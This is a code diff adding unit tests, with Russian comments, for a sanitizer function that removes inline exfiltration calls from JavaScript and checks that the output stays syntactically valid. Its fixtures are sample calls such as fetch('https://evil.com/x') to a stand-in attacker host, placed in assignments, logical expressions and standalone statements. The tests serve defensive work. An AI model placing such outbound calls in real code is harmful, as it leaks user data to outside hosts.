@@ -97,4 +97,41 @@ describe('removeInlineExfil', () => {
       removeInlineExfil(code, { source: code, relPath: 'test.html', mainHost: 'example.com' }, ast, log);
     }
   });
+
+  // ── DEC-1 (T-9): удаление exfil-вызова не должно ломать синтаксис ──
+  it('DEC-1: var x = fetch(external) → валидный JS (не "var x = ;")', () => {
+    const code = `var x = fetch('https://evil.com/track');`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull(); // синтаксис валиден
+  });
+
+  it('DEC-1: exfil в логическом выражении (a && fetch) → валидный JS', () => {
+    const code = `ready && fetch('https://evil.com/x');`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('DEC-1: var x = fetch(external); keep(); — keep() и присваивание не съедаются', () => {
+    const code = `var x = fetch('https://evil.com/x'); keep();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).toContain('void 0'); // вызов нейтрализован, не вырезан вместе с keep()
+    expect(out).toContain('keep');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
+
+  it('DEC-1: standalone fetch по-прежнему удаляется целиком', () => {
+    const code = `fetch('https://evil.com/x'); keep();`;
+    const { code: out, removed } = run(code);
+    expect(removed).toBe(1);
+    expect(out).not.toContain('evil.com');
+    expect(out).not.toContain('void 0'); // целый statement убран, не нейтрализован
+    expect(out).toContain('keep');
+    expect(parseJs(out, 't.js')).not.toBeNull();
+  });
 });
